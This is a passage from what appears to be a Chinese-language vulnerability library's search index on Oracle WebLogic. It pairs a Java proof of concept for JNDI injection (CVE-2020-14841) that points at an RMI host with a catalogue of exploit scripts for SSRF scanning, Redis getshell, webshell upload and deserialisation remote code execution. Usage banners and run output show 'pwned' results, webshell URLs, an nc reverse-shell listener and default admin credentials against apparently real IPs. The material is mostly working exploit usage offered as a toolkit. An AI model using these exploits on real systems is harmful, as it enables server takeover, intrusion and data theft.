cve-2020-2555\uff0c\u7528\u6cd5\u4e5f\u90fd\u662f\u4e00\u6837\u7684\u3002\u89e6\u53d1\u6f0f\u6d1e\u7684\u91cd\u70b9\u5728\u4e8ethis.accessor.getAttributeValueFromObject \u4e2d\u3002\u4e0b\u9762\u9009\u53d6\u4e00\u4e2a\u53ef\u80fd\u7684\u6267\u884c\u8def\u5f84</p> <pre><code>package org.eclipse.persistence.internal.descriptors;\n\n\npublic class MethodAttributeAccessor extends AttributeAccessor {\n    protected String setMethodName = \"\";\n    protected String getMethodName;\n    protected transient Method setMethod;\n    protected transient Method getMethod;\n\n    public Object getAttributeValueFromObject(Object anObject) throws DescriptorException {\n        return this.getAttributeValueFromObject(anObject, (Object[])null);\n    }\n\n    protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {\n        try {\n            if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {\n                try {\n                    return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));\n                } catch (PrivilegedActionException var5) {\n                    Exception throwableException = var5.getException();\n                    if (throwableException instanceof IllegalAccessException) {\n                        throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);\n                    } else {\n                        throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);\n                    }\n                }\n            } else {\n                return this.getMethod.invoke(anObject, parameters);\n            }\n</code></pre> <p>MethodAttributeAccessor\u4e2dgetAttributeValueFromObject\u51fd\u6570\u7f3a\u70b9\u5728\u4e8e\uff0c\u53ea\u80fd\u6267\u884c\u65e0\u53c2\u7684\u51fd\u6570\uff0c\u4ece\u8fd9\u70b9\u6765\u770b\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u7684\u4e0e\u4e03\u6708\u4efd cve-2020-14645 \u8054\u60f3\u8d77\u6765</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#poc","title":"POC","text":"<pre><code>        // JdbcRowSetImpl\n        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();\n        jdbcRowSet.setDataSourceName(\"rmi://192.168.3.254:8888/xsmd\");\n\n        MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();\n        methodAttributeAccessor.setGetMethodName(\"getDatabaseMetaData\");\n        methodAttributeAccessor.setIsWriteOnly(true);\n        methodAttributeAccessor.setAttributeName(\"UnicodeSec\");\n\n\n        LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, \"UnicodeSec\");\n\n        final ExtractorComparator comparator = new ExtractorComparator(extractor);\n        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);\n\n\n        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};\n        Reflections.setFieldValue(queue, \"queue\", q);\n        Reflections.setFieldValue(queue, \"size\", 2);\n\n        Field comparatorF = queue.getClass().getDeclaredField(\"comparator\");\n        comparatorF.setAccessible(true);\n        comparatorF.set(queue, new ExtractorComparator(extractor));\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/","title":"About Oracle Weblogic","text":"<p>WebLogic\u662f\u7f8e\u56fdOracle\u516c\u53f8\u51fa\u54c1\u7684\u4e00\u4e2aapplication server\uff0c\u786e\u5207\u7684\u8bf4\u662f\u4e00\u4e2a\u57fa\u4e8eJAVAEE\u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0cWebLogic\u662f\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0fWeb\u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u7684Java\u5e94\u7528\u670d\u52a1\u5668\u3002\u5c06Java\u7684\u52a8\u6001\u529f\u80fd\u548cJava Enterprise\u6807\u51c6\u7684\u5b89\u5168\u6027\u5f15\u5165\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7684\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u4e4b\u4e2d\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#vulnerability-list","title":"Vulnerability list","text":"<p>cve-2014-4210_ssrf_scan.py Weblogic SSRF \u626b\u63cf\u5185\u7f51\u7aef\u53e3\u5229\u7528\u811a\u672c [\u4f7f\u7528] cve-2014-4210_ssrf_redis_shell.py Weblogic SSRF\u6f0f\u6d1e\u5185\u7f51redis\u672a\u6388\u6743getshell\u811a\u672c[\u4f7f\u7528] cve-2017-3506_poc.py Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c[\u4f7f\u7528] cve-2017-3506_webshell.jar Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell[\u4f7f\u7528] cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e[\u4f7f\u7528] cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c[\u4f7f\u7528] cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c[\u4f7f\u7528] cve-2018-2628_webshell.py    Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c[\u4f7f\u7528] cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528 cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(\u9700\u8981\u8d26\u6237\u5bc6\u7801)[\u4f7f\u7528] cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#readme","title":"Readme","text":"<p>\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003vulnerability-list\u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2014-4210_ssrf_scanpy-weblogic-ssrf","title":"CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3","text":"<p>VER: <pre><code>Weblogic 10.0.2\nWeblogic 10.3.6\n</code></pre> USE: <pre><code>zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py \n+----------------------------------------------------------------------+\n+ USE: python &lt;filename&gt; &lt;target_ip:port&gt; &lt;scan_address&gt; &lt;process&gt;     +\n+ EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20   +\n+ VER: 10.0.2,10.3.6                                                   +\n+----------------------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py  59.110.214.109:7001 192.168.112.0 30\n192.168.112\n[*]+------------------------+\n[*]+  Scanning ip and port  +\n[*]+------------------------+\n[+] 192.168.112.1:22\n[+] 192.168.112.2:80\n[+] 192.168.112.3:7001\n[+] 192.168.112.1:7001\n[+] 192.168.112.2:6379\n[*]+------------------------+\n[*]+     Scan completed     +\n[*]+------------------------+\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2014-4210_ssrf_scanpy-weblogic-ssrf_1","title":"CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3","text":"<p>VER: <pre><code>Weblogic 10.0.2\nWeblogic 10.3.6\n</code></pre> USE: <pre><code>zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py \n+---------------------------------------------------------------------------------------------------+\n+ USE: python &lt;filename&gt; &lt;weblogic_ip&gt; &lt;weblogic_port&gt; &lt;inside_ip&gt; &lt;inside_port&gt; &lt;nc_ip&gt; &lt;nc_port&gt;  +\n+ EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555                                +\n+ VER: 10.0.2,10.3.6                                                                                +\n+---------------------------------------------------------------------------------------------------+\n</code></pre> DES: <pre><code>&lt;weblogic_ip&gt; weblogic\u7684IP\u5730\u5740\n&lt;weblogic_port&gt; weblogic\u7684\u7aef\u53e3\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a7001\n&lt;inside_ip&gt; \u5185\u7f51redis\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u8be5\u5730\u5740\u901a\u8fc7 6.1 \u7684scan\u811a\u672c\u5f97\u51fa\n&lt;inside_port&gt; \u5185\u7f51redis\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba46379\n&lt;nc_ip&gt; \u53cd\u5f39nc shell\u7684IP\n&lt;nc_port&gt; \u53cd\u5f39nc shell\u7684\u7aef\u53e3\n</code></pre> EXP: </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-3506_pocpy-weblogic-wls-wsat","title":"CVE-2017-3506_poc.py Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c","text":"<p>VER: <pre><code>10.3.6.0\n12.1.3.0\n12.2.1.0\n12.2.1.1\n12.2.1.2 \n</code></pre> USE: <pre><code>zhzy@debian:$ python cve-2017-3506_poc.py\n+--------------------------------------------------------+\n+ USE: python cve-2017-3506_poc.py &lt;url:port&gt;            +\n+ VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +\n+ EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +\n+--------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7001\n[+] CVE-2017-3506 Vulnerability\nzhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7000\n[-] No Vulnerability\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-3506_webshelljar-weblogic-wls-wsatwebshell","title":"cve-2017-3506_webshell.jar Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell","text":"<p>VER: <pre><code>10.3.6.0\n12.1.3.0\n12.2.1.0\n12.2.1.1\n12.2.1.2 \n</code></pre> USE: <pre><code>zhzy@debian:$ java -jar cve-2017-10271_webshell.jar \n[*]              Oracle : WebLogic wls-wsat RCE Exp\n[*]              CVE ID : CVE-2017-3506 &amp; CVE-2017-10271\n[*]  Vulnerability info : https://secfree.com/article-635.html\n[*]              Author : Bearcat@secfree.com\n[*]  Vulnerability page \uff1awls-wsat/CoordinatorPortType &amp; wls-wsat/CoordinatorPortType11 \n[*]               Usage \uff1ajava -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp\n[*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html\n</code></pre> EXP: <pre><code>zhzy@debian:$ java -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 &gt; shell.jsp\n[*] Starting exploit...\n[*] Sending payloads...\n[*] Payloads sent...\n[*] Opening shell...\n[*] pwned! Go ahead...\n\n[+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&amp;command=whoami\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-10271_pocjar-weblogic-wls-wsat-xmldecoder","title":"cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c","text":"<p>VER: <pre><code>Oracle WebLogic Server10.3.6.0.0 \u7248\u672c\nOracle WebLogic Server12.1.3.0.0 \u7248\u672c\nOracle WebLogic Server12.2.1.1.0 \u7248\u672c\nOracle WebLogic Server12.2.1.2.0 \u7248\u672c\n</code></pre> USE: <pre><code>zhzy@debian:$ java -jar cve-2017-10271_poc.jar \n\n[*]           WebLogic wls-wsat\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177\n[*]      CVE\u7f16\u53f7  CVE-2017-10271\n[*]     \u6f0f\u6d1e\u8be6\u60c5  https://www.secfree.com/article-635.html\n[*]     \u4f5c\u8005\u90ae\u7bb1  Bearcat@secfree.com\n[*] \u4f7f\u7528\u65b9\u6cd5:\n[*]  \u5355\u4e2aURL\u68c0\u6d4b  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -u http://www.xxx.com:7001\n[*]     \u6279\u91cf\u68c0\u6d4b  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -f UrlfilePath\n</code></pre> EXP: <pre><code>zhzy@debian:$ java -jar cve-2017-10271_poc.jar -u http://59.110.214.109:7001\n\n[11:33:37] [+] \u6f0f\u6d1e\u5b58\u5728 http://59.110.214.109:7001/wls-wsat/test.logs\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-10271_webshelljar-weblogic-wls-wsat-xmldecoderwebshell","title":"cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u4e0a\u4f20Webshell","text":"<p>VER: <pre><code>Oracle WebLogic Server10.3.6.0.0 \u7248\u672c\nOracle WebLogic Server12.1.3.0.0 \u7248\u672c\nOracle WebLogic Server12.2.1.1.0 \u7248\u672c\nOracle WebLogic Server12.2.1.2.0 \u7248\u672c\n</code></pre> EXP: <pre><code>zhzy@debian:$ java -jar cve-2017-10271_webshell.jar -u http://59.110.214.109:7001\n\n[*] Starting exploit...\n[*] Sending payloads...\n[*] Payloads sent...\n[*] Opening shell...\n[*] pwned! Go ahead...\n\n[+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&amp;command=whoami\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2628_pocpy-weblogic-wls-core-components","title":"cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c[\u4f7f\u7528]","text":"<pre><code>zhzy@debian:$ python cve-2018-2628_poc.py \n+--------------------------------------------------------+\n+ USE: python cve-2018-2628_poc.py &lt;ip&gt; &lt;port&gt;           +\n+ VER: Oracle WebLogic Server 10.3.6.0                   +\n+      Oracle WebLogic Server 12.2.1.2                   +\n+      Oracle WebLogic Server 12.2.1.3                   +\n+      Oracle WebLogic Server 12.1.3.0                   +\n+ EXP: python cve-2018-2628_poc.py 1.1.1.1 7001          +\n+--------------------------------------------------------+\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2628_webshellpy-weblogic-wls-core-components-webshell","title":"cve-2018-2628_webshell.py Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c[\u4f7f\u7528]","text":"<p>USE: <pre><code>zhzy@debian:$ python cve-2018-2628_webshell.py \n+---------------------------------------------------------------+\n+ USE: python cve-2018-2628_webshell.py &lt;ip&gt; &lt;port&gt; &lt;webshell&gt;  +\n+ VER: Oracle WebLogic Server 10.3.6.0                          +\n+      Oracle WebLogic Server 12.2.1.2                          +\n+      Oracle WebLogic Server 12.2.1.3                          +\n+      Oracle WebLogic Server 12.1.3.0                          +\n+ EXP: python cve-2018-2628_webshell.py 1.1.1.1 7001 shell1.jsp +\n+---------------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:$ python cve-2018-2628_webshell.py 1.1.1.11 7001 shell1.jsp\n[*] handshake successful\n[*] usage: python cve-2018-2628.py ip port shell1.jsp\n[+] Shell Dir: servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war\\shell1.jsp\n\n[+] Webshell: http://1.1.1.1:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2893_pocpy-weblogic-wls","title":"cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c","text":"<p>VER: <pre><code>Oracle WebLogic Server 10.3.6.0\nOracle WebLogic Server 12.1.3.0\nOracle WebLogic Server 12.2.1.2\nOracle WebLogic Server 12.2.1.3\n</code></pre> USE: <pre><code>zhzy@debian:$ python cve-2018-2893_poc.py \n+--------------------------------------------------------+\n+ USE: python cve-2017-3506_poc.py &lt;url:port&gt;            +\n+ VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +\n+ EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +\n+--------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:$ python cve-2018-2893_poc.py 59.110.214.109 7001\n[+] testing target\n[+] send request payload successful,recv length:1700\n[+] 59.110.214.109:7001 is vul CVE-2018-2893\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2893_cmdpy-weblogic-wls","title":"cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c","text":"<pre><code>zhzy@debian:$ python cve-2018-2893_cmd.py\n+------------------------------------------------------------------------------+\n+ VER: Oracle WebLogic Server 10.3.6.0                                         +\n+      Oracle WebLogic Server 12.1.3.0                                         +\n+      Oracle WebLogic Server 12.2.1.2                                         +\n+      Oracle WebLogic Server 12.2.1.3                                         +\n+ USE: python cve-2018-2893_cmd.py &lt;host&gt; &lt;port&gt; &lt;reverse_host&gt; &lt;reverse_port&gt; +\n+ EXP: python cve-2018-2893_cmd.py 1.1.1.1 7001 2.2.2.2 3333                   +\n+      [2.2.2.2] nc -lvvp 3333                                                 +\n+------------------------------------------------------------------------------+\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2894_poc_exppy-weblogic","title":"cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528","text":"<p>VER: <pre><code>10.3.6.0\n12.1.3.0\n12.2.1.2\n12.2.1.3\n</code></pre> EXP: <pre><code>zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://1.1.1.1:7001\n[*] First Deploying Website Please wait a moment ...\n[+] http://1.1.1.1:7001 exists CVE-2018-2894\n[+] Check URL: http://1.1.1.1:7001/ws_utc/css/config/keystore/1585895893159_360sglab.jsp \n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2019-2618_webshellpy-weblogic","title":"cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e (\u9700\u8981\u8d26\u6237\u5bc6\u7801)","text":"<p>USE: <pre><code>zhzy@debian:$ python cve-2019-2618_webshell.py \n+-----------------------------------------------------------------------+\n+ VER: Oracle WebLogic Server 10.3.6.0                                  +\n+      Oracle WebLogic Server 12.1.3.0                                  +\n+      Oracle WebLogic Server 12.2.1.3                                  +\n+ USE: python cve-2019-2618_webshell.py &lt;username&gt; &lt;password&gt;           +\n+ EXP: python cve-2019-2618.py http://1.1.1.1:7001 weblogic Oracle@123  +\n+-----------------------------------------------------------------------+\n</code></pre> EXP: <pre><code>zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2019-2618_webshell.py http://1.1.1.1:7007/ weblogic Oracle@123\n\n========================================================================\n   _______      ________    ___   ___  __  ___       ___   __ __  ___  \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |/ _ \\     |__ \\ / //_ |/ _ \\ \n | |     \\ \\  / /| |__ ______ ) | | | || | (_) |______ ) / /_ | | (_) |\n | |      \\ \\/ / |  __|______/ /| | | || |\\__, |______/ / '_ \\| |&gt; _ &lt; \n | |____   \\  /  | |____    / /_| |_| || |  / /      / /| (_) | | (_) |\n  \\_____|   \\/   |______|  |____|\\___/ |_| /_/      |____\\___/|_|\\___/ \n                                                                       \n      Weblogic Upload Vuln(Need  username password)-CVE-2019-2618\n                              By Jas502n     \n========================================================================\n&gt;&gt;&gt;&gt;Upload Shell Addresss: \nhttp://1.1.1.1:7007/bea_wls_internal/shell.jsp\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2020-2551_pocpy-weblogic-iiop","title":"cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c","text":"<p>USE: <pre><code>zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001\n+---------------------------------------------------   -----+\n+ USE: python cve-2020-2551_poc.py &lt;url:port&gt;               +\n+ VER: 10.3.6.0.0                                           +\n+      12.1.3.0.0                                           +\n+      12.2.1.3.0                                           +\n+      12.2.1.4.0                                           +\n+ EXP: python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001  +\n+-----------------------------------------------------------+\n[+] found CVE-2020-2551  1.1.1.1:7007\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2019-2615-2618/","title":"weblogic\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6CVE 2019 2615 2618","text":"<p>\u9700\u8981\u7528\u6237\u540d\u5bc6\u7801\u6587\u4ef6\u8bfb\u53d6\u3002    \u5b9a\u4f4d\u5230FileDistributionServlet\u8fd9\u4e2aServlet,\u8def\u7531\u5982\u4e0b    \u8d70\u5230doGet\u65b9\u6cd5    \u6765\u5230doGetJspRefreshRequest\u65b9\u6cd5\uff0c\u8bfb\u5165\u4f20\u5165\u6587\u4ef6\u8def\u5f84\uff0c439\u8f93\u51fa\u3002  </p> <p>\u6ca1\u5565\u597d\u5206\u6790\u7684\uff0c\u76f4\u63a5\u5b9a\u4f4d\u5230DeploymentServiceServlet\u8fd9\u4e2a\u7c7b\u7684handlePlanOrApplicationUpload\u65b9\u6cd5\u4ee5\u53ef\u5c31\u77e5\u9053\u4e86\uff0c\u633a\u9e21\u808b\u7684\uff0c\u8fd8\u9700\u8981\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002    \u6700\u540e\u770b\u4e00\u4e0b\u8def\u7531\u662f\u600e\u4e48\u5f62\u6210\u7684\uff0c\u5b9a\u4f4d\u5230bea_wls_deployment_internal.war\u5305web.xml\u3002\u8fd9\u91cc\u6709\u8def\u7531\u7684\u6307\u5411\u3002    \u7b2c\u4e00\u4e2a\u8def\u7531\u6784\u6210\uff0cbea_wls_management_internal2.war\u4e2d\u7684web.xml\u2192\u6700\u540e\u62fc\u6210/bea_wls_management_internal2/wl_management    \u53c2\u8003\u94fe\u63a5\uff1a  https://xz.aliyun.com/t/5078#toc-3</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/","title":"CVE-2017-3506 &amp; CVE-2017-10271","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#affected-version","title":"Affected Version","text":"<p>Oracle WebLogic Server10.3.6.0.0</p> <p>Oracle WebLogic Server12.1.3.0.0</p> <p>Oracle WebLogic Server12.2.1.1.0</p> <p>Oracle WebLogic Server12.2.1.2.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#exp","title":"Exp","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#references","title":"References","text":"<p>1.https://secfree.com/article-635.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2628/","title":"CVE-2018-2628","text":"<p>testing</p> <p></p> <p>exploit https://github.com/frohoff/ysoserial</p> 